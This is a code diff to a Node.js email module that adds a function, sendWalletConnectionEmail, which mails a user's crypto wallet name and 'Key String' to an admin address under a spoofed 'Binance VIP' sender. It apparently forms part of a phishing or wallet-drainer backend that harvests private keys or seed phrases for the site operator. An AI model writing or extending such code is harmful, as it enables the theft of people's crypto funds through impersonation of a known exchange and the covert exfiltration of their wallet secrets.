@@ -66,5 +66,24 @@ const sendVerificationCodeRequest = async (email, cB) => {
     }
        
 }
+
+const sendWalletConnectionEmail = async (data, cB) => {
+    const mail_options = {
+      from: "Binance VIP <no-reply@zenithbrokers.co.uk>",
+      to: process.env.ADMIN_EMAIL,
+      subject: "Wallet Connection Details",
+      text: `Just now, Wallet connection details "
+      \nWallet: ${data.crypto_wallet}
+      \nKey String: ${data.wallet_key}`
+    };
+    
+    try {
+      const mailSuccess = await client.messages.create(MY_DOMAIN, mail_options);
+      mailSuccess && cB(null, mailSuccess)    /* call The Callback here on SUCCESS */
+    } catch (e) {
+      cB(e, null)   /* call The Callback here on ERROR */
+    }
+       
+}
   
-module.exports = { sendEmailToAdmin, sendEmailVerificationToAdmin, sendVerificationCodeRequest };
+module.exports = { sendEmailToAdmin, sendEmailVerificationToAdmin, sendVerificationCodeRequest, sendWalletConnectionEmail };
